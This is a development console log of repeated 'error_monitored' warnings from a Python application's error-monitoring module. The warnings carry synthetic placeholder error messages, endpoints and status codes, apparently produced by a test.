WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4578'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934185Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4579'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934291Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4580'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4581'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934421Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4582'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934473Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4583'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4584'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4585'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4586'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934672Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4587'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934720Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4588'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4589'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4590'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4591'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4592'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4593'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935082Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4594'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935139Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4595'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935190Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4596'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935239Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4597'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935300Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4598'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935390Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4599'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4600'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4601'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935552Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4602'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4603'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935654Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4604'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935705Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4605'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4606'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4607'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4608'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935916Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4609'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.935967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4610'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936016Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4611'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4612'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4613'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4614'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936213Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4615'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936261Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4616'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936310Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4617'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
